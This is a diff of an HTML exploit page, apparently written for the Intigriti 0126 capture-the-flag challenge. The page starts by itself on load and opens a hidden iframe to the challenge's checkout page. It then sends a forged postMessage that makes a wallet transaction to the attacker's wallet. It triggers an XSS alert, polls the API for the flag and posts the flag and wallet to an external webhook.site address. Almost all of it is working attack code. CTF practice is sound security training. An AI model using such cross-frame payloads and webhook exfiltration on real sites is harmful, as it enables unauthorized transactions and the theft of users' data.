@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Exploit</title>
+    <title>Intigriti 0126 - Fixed Exploit</title>
     <meta charset="UTF-8">
     <style>
         body { font-family: monospace; background: #0a0a0a; color: #0f0; padding: 20px; }
@@ -20,9 +20,10 @@
     <script>
         const TARGET = 'https://challenge-0126.intigriti.io';
         const OUR_WALLET = '16472226db03703a192aa383237035a69f';
-        const WEBHOOK = 'https://webhook.site/da57c199-07c1-4b21-9587-66d831cd9083';
+        const WEBHOOK = 'https://webhook.site/a9f6f6d3-2436-4a82-ab91-40cb382b5e33';
 
         let step = 0;
+        let flagFound = false;
 
         function log(msg, type = 'info') {
             step++;
@@ -45,35 +46,39 @@
             }).catch(() => {});
         }
 
+        // Non-blocking alert using timeout
+        function nonBlockingAlert(message) {
+            setTimeout(() => {
+                alert(message);
+            }, 100);
+        }
+
         async function exploit() {
             log('🚀 EXPLOIT STARTED', 'info');
 
             try {
-                // STEP 1: Trigger XSS alert (requirement)
-                log('Triggering XSS alert: alert("gigawatz")', 'info');
-                alert('gigawatz');
-                log('✅ XSS alert triggered!', 'success');
-
-                // STEP 2: Create iframe to checkout.html
+                // STEP 1: Create iframe to checkout.html (DO THIS FIRST - alert blocks!)
                 log('Creating iframe to checkout.html...', 'info');
                 const iframe = document.createElement('iframe');
                 iframe.style.display = 'none';
                 iframe.src = TARGET + '/checkout.html?currency=1337COIN&price=1';
                 document.body.appendChild(iframe);
+                log('✅ Iframe created', 'success');
 
-                // STEP 3: Wait for iframe to load
+                // STEP 2: Wait for iframe to load
+                log('Waiting for iframe to load...', 'info');
                 await new Promise(resolve => {
                     iframe.onload = resolve;
-                    setTimeout(resolve, 5000); // Fallback timeout
+                    setTimeout(resolve, 6000); // Fallback timeout
                 });
-
                 log('✅ Iframe loaded', 'success');
 
-                // STEP 4: Wait for wallets to load (async operation)
+                // STEP 3: Wait for wallets to load (async operation)
                 log('Waiting for wallet data to load...', 'info');
                 await new Promise(r => setTimeout(r, 3000));
+                log('✅ Wallets should be loaded now', 'success');
 
-                // STEP 5: Send malicious postMessage
+                // STEP 4: Send malicious postMessage
                 log('Sending postMessage to trigger transaction...', 'info');
 
                 iframe.contentWindow.postMessage({
@@ -87,21 +92,33 @@
 
                 log('✅ postMessage sent - transaction initiated', 'success');
 
+                // STEP 5: Trigger XSS alert (non-blocking, after transaction sent)
+                log('Triggering XSS alert: alert("gigawatz")', 'info');
+                nonBlockingAlert('gigawatz');
+                log('✅ XSS alert triggered (non-blocking)', 'success');
+
                 // STEP 6: Wait for transaction to complete
-                log('Waiting 5 seconds for transaction...', 'info');
+                log('Waiting 5 seconds for transaction to process...', 'info');
                 await new Promise(r => setTimeout(r, 5000));
 
-                // STEP 7: Check for flag
+                // STEP 7: Check for flag multiple times
+                log('Starting flag checks...', 'info');
                 await checkFlag();
                 await new Promise(r => setTimeout(r, 3000));
                 await checkFlag();
                 await new Promise(r => setTimeout(r, 3000));
                 await checkFlag();
 
-                log('🎯 EXPLOIT COMPLETE - Check webhook for flag!', 'success');
+                if (!flagFound) {
+                    log('⚠ Flag not found yet - transaction may still be processing', 'error');
+                    log('Check webhook in 30 seconds for delayed flag', 'info');
+                } else {
+                    log('🎯 EXPLOIT COMPLETE - FLAG FOUND!', 'success');
+                }
 
             } catch (error) {
                 log('❌ ERROR: ' + error.message, 'error');
+                log('Stack: ' + error.stack, 'error');
                 console.error(error);
             }
         }
@@ -116,11 +133,11 @@
 
                 const data = await response.json();
 
-                log('API Response: hasFlag=' + !!data.flag, 'info');
+                log('API /me response: status=' + response.status + ', hasFlag=' + !!data.flag, 'info');
 
                 if (data.flag) {
-                    log('🏆 FLAG FOUND: ' + data.flag, 'success');
-                    alert('🏆 FLAG: ' + data.flag);
+                    flagFound = true;
+                    log('🏆🏆🏆 FLAG FOUND: ' + data.flag + ' 🏆🏆🏆', 'success');
 
                     // Send flag to webhook
                     fetch(WEBHOOK, {
@@ -130,11 +147,22 @@
                         body: JSON.stringify({
                             timestamp: new Date().toISOString(),
                             flag: data.flag,
-                            challenge: 'intigriti-0126'
+                            challenge: 'intigriti-0126',
+                            wallet: OUR_WALLET
                         })
                     }).catch(() => {});
 
+                    // Also alert with flag (non-blocking)
+                    nonBlockingAlert('🏆 FLAG: ' + data.flag);
+
                     return true;
+                } else {
+                    log('No flag yet - user has ' + (data.wallets?.length || 0) + ' wallets', 'info');
+                    if (data.wallets) {
+                        data.wallets.forEach(w => {
+                            log('  Wallet: ' + w.currency + ' - ' + w.address?.substring(0, 16) + '...', 'info');
+                        });
+                    }
                 }
 
                 return false;
@@ -147,8 +175,8 @@
 
         // Auto-start when page loads
         window.addEventListener('load', () => {
-            log('Page loaded - starting exploit in 1 second...', 'info');
-            setTimeout(exploit, 1000);
+            log('Page loaded - starting exploit...', 'info');
+            setTimeout(exploit, 500);
         });
     </script>
 </body>
